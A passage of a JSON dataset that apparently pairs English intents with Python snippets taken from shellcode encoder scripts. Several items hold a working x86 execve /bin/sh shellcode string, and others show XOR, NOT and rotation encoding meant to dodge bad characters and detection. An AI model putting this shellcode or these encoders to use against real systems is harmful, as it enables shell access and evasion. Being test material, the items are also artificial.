\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")"},{"intent": "shellcode is a tuple containing the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "shellcode is a tuple containing the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")"},{"intent": "Declare a tuple called shellcode and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" into it", "rewritten_intent": "Declare a tuple called shellcode and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" into it", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")"},{"intent": "declare the tuple shellcode containing the string \"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "declare the tuple shellcode containing the string \"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")"},{"intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")"},{"intent": "Declare a tuple shellcode and add the string \"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\" into it", "rewritten_intent": "Declare a tuple shellcode and add the string \"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\" into it", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\")"},{"intent": "store in the variable shellcode b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "store in the variable shellcode b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";"},{"intent": "remove the first 2 items from shellcode", "rewritten_intent": "remove the first 2 items from shellcode", "snippet": "shellcode = shellcode[2::]"},{"intent": "shellcode is the first argument after removing string '\\\\x' decoded in hexadecimal", "rewritten_intent": "shellcode is the first argument after removing string '\\\\x' decoded in hexadecimal", "snippet": "shellcode = sys.argv[1].replace('\\\\x', '').decode('hex')"},{"intent": "Declare a tuple shellcode and add the string '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' into it", "rewritten_intent": "Declare a tuple shellcode and add the string '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' into it", "snippet": "shellcode =('\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80')"},{"intent": "shellcode_encoded is an empty bitearray", "rewritten_intent": "shellcode_encoded is an empty bitearray", "snippet": "shellcode_encoded = bytearray()"},{"intent": "store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\\\x'", "rewritten_intent": "store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\\\x'", "snippet": "shellcode_encoded_hex = ''.join('\\\\x{:02x}'.format(x) for x in shellcode_encoded)"},{"intent": "store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','", "rewritten_intent": "store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','", "snippet": "shellcode_encoded_nasm = ''.join('0x{:02x},'.format(x) for x in shellcode_encoded).rstrip(',')"},{"intent": "append the value 0x90 to shellcode_encoded", "rewritten_intent": "append the value 0x90 to shellcode_encoded", "snippet": "shellcode_encoded.append(0x90)"},{"intent": "append the value 0xaa to shellcode_encoded", "rewritten_intent": "append the value 0xaa to shellcode_encoded", "snippet": "shellcode_encoded.append(0xaa)"},{"intent": "append the value of the variable r to shellcode_encoded", "rewritten_intent": "append the value of the variable r to shellcode_encoded", "snippet": "shellcode_encoded.append(r)"},{"intent": "compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded", "rewritten_intent": "compute the value of shellcode_original at index i bitwise xor r then append to shellcode_encoded", "snippet": "shellcode_encoded.append(shellcode_original[i] ^ r)"},{"intent": "compute the value of shellcode_original at index i+1 bitwise xor r then append to shellcode_encoded", "rewritten_intent": "compute the value of shellcode_original at index i+1 bitwise xor r then append to shellcode_encoded", "snippet": "shellcode_encoded.append(shellcode_original[i+1] ^ r)"},{"intent": "compute the value of shellcode_original at index i+2 bitwise xor r then append to shellcode_encoded", "rewritten_intent": "compute the value of shellcode_original at index i+2 bitwise xor r then append to shellcode_encoded", "snippet": "shellcode_encoded.append(shellcode_original[i+2] ^ r)"},{"intent": "compute the value of shellcode_original at index i+3 bitwise xor r then append to shellcode_encoded", "rewritten_intent": "compute the value of shellcode_original at index i+3 bitwise xor r then append to shellcode_encoded", "snippet": "shellcode_encoded.append(shellcode_original[i+3] ^ r)"},{"intent": "set the variable shellcode_file to the first command-line argument", "rewritten_intent": "set the variable shellcode_file to the first command-line argument", "snippet": "shellcode_file = sys.argv[1]"},{"intent": "save the length of execve_shellcode into shellcode_len", "rewritten_intent": "save the length of execve_shellcode into shellcode_len", "snippet": "shellcode_len=len(execve_shellcode)"},{"intent": "read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\\\x' with ''\" and store the result in shellcode_original", "rewritten_intent": "read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\\\x' with ''\" and store the result in shellcode_original", "snippet": "shellcode_original = bytearray.fromhex(f.read().strip().replace('\\\\x',''))"},{"intent": "store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\\\x'", "rewritten_intent": "store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\\\x'", "snippet": "shellcode_original_hex = ''.join('\\\\x{:02x}'.format(x) for x in shellcode_original)"},{"intent": "append 0x90 to the shellcode_original variable", "rewritten_intent": "append 0x90 to the shellcode_original variable", "snippet": "shellcode_original.append(0x90)"},{"intent": "shift is the first element of sys.argv converted to integer", "rewritten_intent": "shift is the first element of sys.argv converted to integer", "snippet": "shift = int(sys.argv[1])"},{"intent": "string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub", "rewritten_intent": "string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub", "snippet": "string1 = decoder_stub.join(encoded)"},{"intent": "stub_has_bad_char is boolean False", "rewritten_intent": "stub_has_bad_char is boolean False", "snippet": "stub_has_bad_char = False"},{"intent": "stub_has_bad_char is boolean True", "rewritten_intent": "stub_has_bad_char is boolean True", "snippet": "stub_has_bad_char = True"},{"intent": "subtract sb from fb and store the result in the variable subfs", "rewritten_intent": "subtract sb from fb and store the result in the variable subfs", "snippet": "subfs = fb-sb"},{"intent": "subtract Dec_hopecode from 255 and store the result in variable suplX", "rewritten_intent": "subtract Dec_hopecode from 255 and store the result in variable suplX", "snippet": "suplX = 255 - Dec_hopcode"},{"intent": "swapped is an empty list", "rewritten_intent": "swapped is an empty list", "snippet": "swapped = []"},{"intent": "append the element x of execve_shellcode to swapped", "rewritten_intent": "append the element x of execve_shellcode to swapped", "snippet": "swapped.append(execve_shellcode[x])"},{"intent": "append the element x + 1 of execve_shellcode to swapped", "rewritten_intent": "append the element x + 1 of execve_shellcode to swapped", "snippet": "swapped.append(execve_shellcode[x+1])"},{"intent": "separate every 4 characters of the string swapped with the separator \", \"", "rewritten_intent": "separate every 4 characters of the string swapped with the separator \", \"", "snippet": "swapped=\", \".join(swapped[i:i+4] for i in range(0, len(swapped), 4))"},{"intent": "add \"0x\" to every 2 characters of the string swapped", "rewritten_intent": "add \"0x\" to every 2 characters of the string swapped", "snippet": "swapped=\"0x\"+\"0x\".join(a+b for a,b in zip(swapped[::2], swapped[1::2]))"},{"intent": "swapped is the hexadecimal represenation of the array of bytes swapped", "rewritten_intent": "swapped is the hexadecimal represenation of the array of bytes swapped", "snippet": "swapped=binascii.hexlify(bytearray(swapped))"},{"intent": "terminate the program", "rewritten_intent": "terminate the program", "snippet": "sys.exit()"},{"intent": "call the exit function from sys with 0 as argument", "rewritten_intent": "call the exit function from sys with 0 as argument", "snippet": "sys.exit(0)"},{"intent": "Set total to the number of command-line arguments", "rewritten_intent": "Set total to the number of command-line arguments", "snippet": "total = len(sys.argv)"},{"intent": "try", "rewritten_intent": "try", "snippet": "try:"},{"intent": "subtract 1 from 2 raised to max_bits and assign the result to val1", "rewritten_intent": "subtract 1 from 2 raised to max_bits and assign the result to val1", "snippet": "val1 = 2**max_bits-1"},{"intent": "val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i", "rewritten_intent": "val1 is the result of the bitwise xor between the integer base 16 of the string byte encoded to hex and i", "snippet": "val1 = int(byte.encode('hex'), 16) ^ i"},{"intent": "val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte", "rewritten_intent": "val2 is the result of the bitwise xor between the integer base 16 of the element i of chunk encoded to hex and xor_byte", "snippet": "val2 = int(chunk[i].encode('hex'), 16) ^ xor_byte"},{"intent": "val2 is rbits modulo max_bits", "rewritten_intent": "val2 is rbits modulo max_bits", "snippet": "val2 = r_bits % max_bits"},{"intent": "W is a string '\\033[0m'", "rewritten_intent": "W is a string '\\033[0m'", "snippet": "W = '\\033[0m'"},{"intent": "while the length of shellcode is greater than integer 0", "rewritten_intent": "while the length of shellcode is greater than integer 0", "snippet": "while len(shellcode) > 0:"},{"intent": "while x is less than shellcode_len", "rewritten_intent": "while x is less than shellcode_len", "snippet": "while x < shellcode_len:"},{"intent": "start a while loop with the condition xor_byte_good if equivalent to False", "rewritten_intent": "start a while loop with the condition xor_byte_good if equivalent to False", "snippet": "while(xor_byte_good == False):"},{"intent": "open the file stored in shellcode_file using an alias variable f", "rewritten_intent": "open the file stored in shellcode_file using an alias variable f", "snippet": "with open(shellcode_file) as f:"},{"intent": "increment x by 1", "rewritten_intent": "increment x by 1", "snippet": "x += 1"},{"intent": "increment x by 2", "rewritten_intent": "increment x by 2", "snippet": "x += 2"},{"intent": "x is not x", "rewritten_intent": "x is not x", "snippet": "x = ~x"},{"intent": "x is 0", "rewritten_intent": "x is 0", "snippet": "x = 0"},{"intent": "assign the variable x the value of the function rol with x and rand as parameters", "rewritten_intent": "assign the variable x the value of the function rol with x and rand as parameters", "snippet": "x = rol(x,rand)"},{"intent": "left shift x by 1", "rewritten_intent": "left shift x by 1", "snippet": "x = x << 1"},{"intent": "x is x xor 0xDD", "rewritten_intent": "x is x xor 0xDD", "snippet": "x = x^0xDD"},{"intent": "assign the variable x the value of the bitwise xor operation of x and rand", "rewritten_intent": "assign the variable x the value of the bitwise xor operation of x and rand", "snippet": "x = x^rand"},{"intent": "set x to y minus 0x10", "rewritten_intent": "set x to y minus 0x10", "snippet": "x = y - 0x10"},{"intent": "set x to y minus 0x2", "rewritten_intent": "set x to y minus 0x2", "snippet": "x = y - 0x2"},{"intent": "xor is the second element of sys.argv converted to integer", "rewritten_intent": "xor is the second element of sys.argv converted to integer", "snippet": "xor = int(sys.argv[2])"},{"intent": "XOR is the third element of sys.argv converted to integer", "rewritten_intent": "XOR is the third element of sys.argv converted to integer", "snippet": "XOR = int(sys.argv[3])"},{"intent": "assign 0 to xor_byte", "rewritten_intent": "assign 0 to xor_byte", "snippet": "xor_byte = 0"},{"intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars", "rewritten_intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters chunk and bad_chars", "snippet": "xor_byte = find_valid_xor_byte(chunk, bad_chars)"},{"intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars", "rewritten_intent": "xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars", "snippet": "xor_byte = find_valid_xor_byte(string1, bad_chars)"},{"intent": "set the variable xor_byte_good to the value False", "rewritten_intent": "set the variable xor_byte_good to the value False", "snippet": "xor_byte_good = False"},{"intent": "set the variable xor_byte_good to the value True", "rewritten_intent": "set the variable xor_byte_good to the value True", "snippet": "xor_byte_good = True"},{"intent": "XOR_HEX is XOR converted to hexadecimal", "rewritten_intent": "XOR_HEX is XOR converted to hexadecimal", "snippet": "XOR_HEX = hex(XOR)"},{"intent": "Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx", "rewritten_intent": "Take the absolute value of subfs then convert subfs to an integer, then cast to a hexadecimal, slice the variable rev_suplx between the indicies 0 and 2 then cast rev_suplx to the type int16, store the value of the summation in the variable xxx", "snippet": "xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))"},{"intent": "compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y", "rewritten_intent": "compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y", "snippet": "y ^= bytearray(shellcode)[1]"},{"intent": "Y is a '\\033[33m'", "rewritten_intent": "Y is a '\\033[33m'", "snippet": "Y = '\\033[33m'"},{"intent": "y is not x", "rewritten_intent": "y is not x", "snippet": "y = ~x"},{"intent": "compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array", "rewritten_intent": "compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array", "snippet": "y = bytearray(shellcode)[0]^bytearray(shellcode)[1]"},{"intent": "set the variable y to x bitwise xor of 0x88", "rewritten_intent": "set the variable y to x bitwise xor of 0x88", "snippet": "y = x ^ 0x88"},{"intent": "set y to x bitwise xor of 0x97", "rewritten_intent": "set y to x bitwise xor of 0x97", "snippet": "y = x ^ 0x97"},{"intent": "y is x xor 0xAA", "rewritten_intent": "y is x xor 0xAA", "snippet": "y = x^0xAA"},{"intent": "set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray", "rewritten_intent": "set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray", "snippet": "y = x^bytearray(shellcode)[n]"},{"intent": "set the variable z to bitwise not x", "rewritten_intent": "set the variable z to bitwise not x", "snippet": "z = ~x"}]